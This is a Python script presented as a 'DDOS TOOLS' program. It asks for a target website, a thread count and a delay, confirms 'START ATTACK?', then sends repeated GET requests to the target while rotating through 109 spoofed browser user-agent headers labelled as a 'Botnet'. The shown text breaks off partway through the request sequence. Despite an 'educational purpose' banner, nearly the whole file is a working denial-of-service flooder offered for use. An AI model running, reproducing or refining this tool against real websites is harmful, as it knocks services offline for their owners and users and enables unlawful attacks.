import gc
from logging import exception
import requests
import time 
import random 
import threading 
import os




## Botnet 
useragentbok = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Mobile Safari/537.36", "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok2 = {"user-agent" : 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok3 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok4 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok5 = {"user-agent": 'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok6 = {"user-agent": 'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok7 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok8 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok9 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok10 = {"user-agent": 'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok11 = {'user-agent': 'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok12 = {'user-agent': 'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok13 = {'user-agent': 'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok14 = {'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok15 = {'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok16 = {'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok17 = {'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok18 = {'user-agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok19 = {'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok20 = {'user-agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok21 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok22 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok23 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok24 = {"user-agent": 'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok25 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok26 = {"user-agent": 'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok27 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok28 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok29 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok30 = {"user-agent": 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3'}
useragentbok31 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok32 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok33 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok34 = {"user-agent": 'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok35 = {"user-agent": 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok36 = {"user-agent": 'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok37 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok38 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok39 = {"user-agent": 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok40 = {"user-agent": 'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok41 = {"user-agent": 'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok42 = {"user-agent": 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok43 = {"user-agent": 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok44 = {"user-agent": 'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok45 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok46 = {"user-agent": 'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok47 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok48 = {"user-agent": 'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok49 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok50 = {"user-agent": 'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok51 = {"user-agent": 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok52 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok53 = {"user-agent": 'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok54 = {"user-agent": 'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok55 = {"user-agent": 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok56 = {"user-agent": 'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok57 = {"user-agent": 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok58 = {"user-agent": 'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok59 = {"user-agent": 'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok60 = {"user-agent": 'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok61 = {"user-agent": 'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok62 = {"user-agent": 'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok63 = {"user-agent": 'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok64 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok65 = {"user-agent": 'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok66 = {"user-agent": 'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok67 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok68 = {"user-agent": 'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok69 = {"user-agent": 'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok70 = {"user-agent": 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok71 = {"user-agent": 'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok72 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok73 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok74 = {"user-agent": 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok75 = {"user-agent": 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok76 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok77 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok78 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok79 = {"user-agent": 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok80 = {"user-agent": 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok81 = {"user-agent": 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok82 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok83 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok84 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok85 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok86 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok87 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok88 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok89 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok90 = {"user-agent": 'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok91 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok92 = {"user-agent": 'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok93 = {"user-agent": 'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok94 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok95 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok96 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok97 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok98 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok99 = {"user-agent": 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok100 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok101 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok102 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok103 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok104 = {"user-agent": 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok105 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok106 = {"user-agent": 'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok107 = {"user-agent": 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok108 = {"user-agent": 'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413', "Accept-Encoding": "*", "Connection": "keep-alive"}
useragentbok109 = {"user-agent": 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)', "Accept-Encoding": "*", "Connection": "keep-alive"}
#title
os.system("cls")
os.system("color b")
print("============================= ")
print("||                         ||")
print("||   DDOS TOOLS BY DOMGO   ||")
print("|| USE IT AT YOUR OWN RISK ||")
print("|| FOR EDUCATIONAL PURPOSE ||")
print("||   Loaded Botnet : 109   ||")
print("||                         ||")
print("=============================  ")

while True: #inputting url
	url = input("\nEnter website : \nExample   : https://example.com\nExample 2 : https://example.com/ex\nweb : ")
	try:
		url = str(url)
		break
	except ValueError as e:
		print("Please input valid url!")
		continue
	except EOFError as e:
		print("Please input valid url!")
		continue
#input threads
print("\n\n")
while True:
	threads = input("How many threads you want to use?  \nWARNING SETTING THE THREADS TOO MANY CAN CAUSE LAG\n: ")
	try:
		threads = int(threads)
		break
	except ValueError as e:
		print("Please input valid number!")
	continue
while True:
	sleepbot = input("How long you the want delay between bot? : ")
	try:
		sleepbot = int(sleepbot)
		break
	except ValueError as e:
		print("Please input valid number!")
	continue

agreement = str(input("START ATTACK? y/n \n: "))
if agreement == 'y' :
	#run ddos
	while True:
		def	runattack():
			try: #requesting
				req = requests.get(url=url, headers=useragentbok)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok2)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok3)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok4)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok5)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok6)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok7)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok8)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok9)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok10)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok11)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok12)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok13)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok14)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok15)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok16)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok17)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok18)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok19)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok20)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok21)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok22)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok23)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok24)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok25)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok26)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok27)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok28)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok29)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok30)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok31)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok32)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok33)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok34)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok35)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok36)
				print("[==request sended==]")
				time.sleep(sleepbot)
				req = requests.get(url=url, headers=useragentbok37)
				print("[==request sended==]")
